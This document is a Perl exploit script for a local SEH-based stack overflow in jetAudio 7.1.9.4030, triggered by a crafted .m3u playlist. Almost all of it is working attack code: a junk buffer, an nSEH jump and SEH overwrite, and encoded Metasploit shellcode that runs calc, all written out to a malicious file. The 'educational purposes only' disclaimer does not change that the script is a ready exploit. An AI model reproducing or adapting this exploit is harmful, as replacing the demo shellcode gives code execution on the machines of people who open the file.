# [+] Vulnerability     : jetAudio v 7.1.9.4030 plus vx (.m3u ) Local Stack Overflow 
# [+] Detected by       : HACK4LOVE (http://www.milw0rm.com/exploits/9359)
# [+] Product           : jetAudio
# [+] Versions affected : 7.1.9.4030 plus vx
# [+] -------------------------------------------------------------------------
# [+] Method            : RET - Universal !
# [+] Tested on         : Windows XP SP3 En
# [+] Xploit written by : corelanc0d3r  (corelanc0d3r[at]gmail[dot]com)
# [+] Greetz&Tx to      : Saumil/SK
# [+] -------------------------------------------------------------------------
#                                               MMMMM~.                          
#                                               MMMMM?.                          
#    MMMMMM8.  .=MMMMMMM.. MMMMMMMM, MMMMMMM8.  MMMMM?. MMMMMMM:   MMMMMMMMMM.   
#  MMMMMMMMMM=.MMMMMMMMMMM.MMMMMMMM=MMMMMMMMMM=.MMMMM?7MMMMMMMMMM: MMMMMMMMMMM:  
#  MMMMMIMMMMM+MMMMM$MMMMM=MMMMMD$I8MMMMMIMMMMM~MMMMM?MMMMMZMMMMMI.MMMMMZMMMMM:  
#  MMMMM==7III~MMMMM=MMMMM=MMMMM$. 8MMMMMZ$$$$$~MMMMM?..MMMMMMMMMI.MMMMM+MMMMM:  
#  MMMMM=.     MMMMM=MMMMM=MMMMM7. 8MMMMM?    . MMMMM?NMMMM8MMMMMI.MMMMM+MMMMM:  
#  MMMMM=MMMMM+MMMMM=MMMMM=MMMMM7. 8MMMMM?MMMMM:MMMMM?MMMMMIMMMMMO.MMMMM+MMMMM:  
#  =MMMMMMMMMZ~MMMMMMMMMM8~MMMMM7. .MMMMMMMMMMO:MMMMM?MMMMMMMMMMMMIMMMMM+MMMMM:  
#  .:$MMMMMO7:..+OMMMMMO$=.MMMMM7.  ,IMMMMMMO$~ MMMMM?.?MMMOZMMMMZ~MMMMM+MMMMM:  
#     .,,,..      .,,,,.   .,,,,,     ..,,,..   .,,,,.. .,,...,,,. .,,,,..,,,,.  
#                                                                   eip hunters
# -----------------------------------------------------------------------------
# Script provided 'as is', without any warranty. 
# Use for educational purposes only.
#

my $sploitfile="c0d3rsploit.m3u";

print " [+] Preparing payload\n";

my $header = "http://";
my $junk = "A" x 1017;
my $nseh = "\xeb\x06\x90\x90";  
my $seh = pack('V',0x01221045); 

# windows/exec - 303 bytes
# http://www.metasploit.com
# Encoder: x86/alpha_upper
# EXITFUNC=seh, CMD=calc
my $shellcode="\x89\xe1\xd9\xee\xd9\x71\xf4\x58\x50\x59\x49\x49\x49\x49" .
"\x43\x43\x43\x43\x43\x43\x51\x5a\x56\x54\x58\x33\x30\x56" .
"\x58\x34\x41\x50\x30\x41\x33\x48\x48\x30\x41\x30\x30\x41" .
"\x42\x41\x41\x42\x54\x41\x41\x51\x32\x41\x42\x32\x42\x42" .
"\x30\x42\x42\x58\x50\x38\x41\x43\x4a\x4a\x49\x4b\x4c\x4a" .
"\x48\x47\x34\x43\x30\x45\x50\x45\x50\x4c\x4b\x51\x55\x47" .
"\x4c\x4c\x4b\x43\x4c\x45\x55\x42\x58\x45\x51\x4a\x4f\x4c" .
"\x4b\x50\x4f\x45\x48\x4c\x4b\x51\x4f\x51\x30\x43\x31\x4a" .
"\x4b\x51\x59\x4c\x4b\x50\x34\x4c\x4b\x43\x31\x4a\x4e\x46" .
"\x51\x49\x50\x4c\x59\x4e\x4c\x4d\x54\x49\x50\x42\x54\x45" .
"\x57\x49\x51\x49\x5a\x44\x4d\x43\x31\x48\x42\x4a\x4b\x4c" .
"\x34\x47\x4b\x50\x54\x47\x54\x45\x54\x43\x45\x4b\x55\x4c" .
"\x4b\x51\x4f\x47\x54\x45\x51\x4a\x4b\x45\x36\x4c\x4b\x44" .
"\x4c\x50\x4b\x4c\x4b\x51\x4f\x45\x4c\x43\x31\x4a\x4b\x4c" .
"\x4b\x45\x4c\x4c\x4b\x45\x51\x4a\x4b\x4c\x49\x51\x4c\x46" .
"\x44\x44\x44\x48\x43\x51\x4f\x50\x31\x4a\x56\x45\x30\x50" .
"\x56\x42\x44\x4c\x4b\x51\x56\x50\x30\x4c\x4b\x51\x50\x44" .
"\x4c\x4c\x4b\x44\x30\x45\x4c\x4e\x4d\x4c\x4b\x43\x58\x45" .
"\x58\x4b\x39\x4a\x58\x4d\x53\x49\x50\x42\x4a\x50\x50\x43" .
"\x58\x4a\x50\x4d\x5a\x44\x44\x51\x4f\x45\x38\x4a\x38\x4b" .
"\x4e\x4c\x4a\x44\x4e\x50\x57\x4b\x4f\x4d\x37\x42\x43\x43" .
"\x51\x42\x4c\x42\x43\x43\x30\x41\x41";


my $footer="E" x (2000-length(junk.nseh.seh.shellcode));

my $payload = $header.$junk.$nseh.$seh.$shellcode.$footer;

print " [+] Writing payload to file\n";

open(sploitf,">$sploitfile");
print sploitf $payload;
close(sploitf);
print " [+] Exploit file " . sploitfile . " created\n";
print " [+] Wrote " . length($payload) . " bytes\n";

